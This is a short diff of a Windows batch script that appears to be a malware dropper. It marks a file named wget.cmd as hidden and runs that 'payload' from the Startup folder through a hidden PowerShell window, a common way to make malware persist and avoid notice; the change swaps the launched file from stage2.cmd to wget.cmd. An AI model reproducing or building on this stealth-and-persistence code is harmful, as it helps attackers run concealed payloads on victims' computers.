@@ -23,7 +23,7 @@ REM hide the stage2.cmd file
 attrib +h wget.cmd
  
 REM run payload 
-powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\stage2.cmd' -WindowStyle Hidden"
+powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\wget.cmd' -WindowStyle Hidden"
 
 REM cd back into initial location
 REM cd /d "%INITIALPATH%"
